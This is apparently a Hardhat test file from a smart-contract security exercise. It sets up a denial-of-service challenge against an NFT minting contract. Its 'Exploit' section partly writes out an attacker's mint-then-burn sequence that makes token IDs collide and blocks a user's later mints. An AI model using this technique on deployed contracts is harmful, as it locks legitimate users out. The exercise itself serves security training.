const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('DOS Exercise 4', function () {

    let deployer, user, attacker;

    const MINT_PRICE = ethers.utils.parseEther('1'); // 1 ETH
    
    before(async function () {
        /** SETUP EXERCISE - DON'T CHANGE ANYTHING HERE */

        [deployer, user, attacker] = await ethers.getSigners();

        // Attacker balance is 2.5 ETH
        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x22B1C8C1227A0000", // 2.5 ETH (ETH -> WEI -> Hexdecimal)
        ]);
    
        // Deploy contracts
        const GalacticGorillasFactory = await ethers.getContractFactory(
            'contracts/dos-4/GalacticGorillas.sol:GalacticGorillas',
            deployer
        );
        this.nft = await GalacticGorillasFactory.deploy();
    });

    it('Success minting tests', async function () {
        let deployerBalanceBefore = await ethers.provider.getBalance(deployer.address);
        await this.nft.connect(user).mint(2, {value: MINT_PRICE.mul(2)});
        expect(await this.nft.balanceOf(user.address)).to.be.equal(2)
        expect(await this.nft.ownerOf(1)).to.be.equal(user.address)
        expect(await this.nft.ownerOf(2)).to.be.equal(user.address)
        let deployerBalanceAfter = await ethers.provider.getBalance(deployer.address);
        expect(deployerBalanceAfter).to.be.equal(deployerBalanceBefore.add(MINT_PRICE.mul(2)))
    });

    it('Failure minting tests', async function () {
        await expect(this.nft.connect(user).mint(20)).to.be.revertedWith("wrong _mintAmount")
        await expect(this.nft.connect(user).mint(1)).to.be.revertedWith("not enough ETH")
        await expect(this.nft.connect(user).mint(4, {value: MINT_PRICE.mul(4)})).to.be.revertedWith("exceeded MAX_PER_WALLET")
    });

    it('Pause tests', async function () {
        await expect(this.nft.connect(user).pause(true)).to.be.revertedWith("Ownable: caller is not the owner")
        await this.nft.pause(true);
        await expect(this.nft.connect(user).mint(1, {value: MINT_PRICE})).to.be.revertedWith("contract is paused")
        await this.nft.pause(false);
        await this.nft.connect(user).mint(1, {value: MINT_PRICE})
        expect(await this.nft.balanceOf(user.address)).to.be.equal(3)
    });

    it('Exploit', async function () {
        /** CODE YOUR SOLUTION HERE */
        
        // [1, 2, 3] - Owned by user
        // 3 - total supply

        // [4, 5] - Owned by attacker
        // 5 - total supply
        let tx = await this.nft.connect(attacker).mint(2, {value: MINT_PRICE.mul(2)});
        let receipt = await tx.wait()

        let mintedId = receipt.events[0].args.tokenId;
        await this.nft.connect(attacker).burn(mintedId)

        // Ask to burn 4 
        // 4 - total supply

        // User is asking to mint a more token
        // TokenId - 5 (totalSupply + 1)

        
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // User can't mint nfts even though he is eligable for 2 additional mints
        await expect(this.nft.connect(user).mint(1, {value: MINT_PRICE})).to.be.reverted;
    });
});
